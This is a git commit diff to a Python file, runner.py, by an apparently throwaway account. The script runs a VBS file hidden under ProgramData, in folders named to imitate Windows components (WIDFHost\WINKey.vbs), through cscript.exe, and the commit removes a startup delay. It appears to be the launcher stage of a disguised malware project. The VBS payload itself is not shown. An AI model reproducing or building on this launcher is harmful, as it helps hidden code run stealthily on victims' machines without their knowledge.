1c5bf0a58643b91a5dd5a2a72ac7c59910ae1f5f
gitlab124 <dsf78er2xder512325er@tutamail.com>
2024-10-27 18:26:28 +0100

    runner.py

--- runner.py
+++ runner.py
@@ -1,10 +1,9 @@
 import os
 import subprocess
-import time
 
 chemin_executable = os.path.join(os.environ['ProgramData'], 'WIDFHost', 'WINKey.vbs')
 
-time.sleep(5)
+#time.sleep(5)
 
 if os.path.isfile(chemin_executable):
     subprocess.run(['cscript.exe', chemin_executable])
